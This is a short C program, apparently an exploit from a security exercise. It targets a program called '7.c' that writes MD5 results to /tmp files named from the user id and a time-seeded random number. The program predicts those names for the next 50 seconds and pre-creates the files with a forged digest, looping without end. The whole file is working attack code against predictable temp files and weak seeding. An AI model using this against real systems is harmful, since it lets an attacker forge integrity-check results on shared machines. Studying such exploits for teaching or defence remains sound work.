#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

void predict_filenames_and_write() {
  /* This is the initial epoch, in seconds */
  int t = time(0);

  while (1) {
    /* Predict the random numbers for the next 50 seconds */
    printf("Looping...\n");
    for (int i = 0; i < 50; i++) {
      char out_path[120];

      /* Seed (or initialize) the random number generator by (t + i) */
      srand(t + i);

      /* Compute the random number */
      int randnum = (rand() << 15) | rand();

      /* This is how out_path is generated in 7.c */
      sprintf(out_path, "/tmp/md5sum_result_%d_%d", getuid(), randnum);

      /* Open the output file where MD5 results will be stored */
      FILE* fp = fopen(out_path, "wb");

      if (fp == NULL) {
        fprintf(stderr, "Cant open the md5 input file. Try it later...");
        continue;
      }

      /* Write the desired MD5 digest to the file */
      fwrite("5bbbbc107dd9c0ee0b6503025bafca6e", 32, 1, fp);
      /* Close the file pointer */
      fclose(fp);
    }
  }
}

int main(int argc, char** argv) { predict_filenames_and_write(); }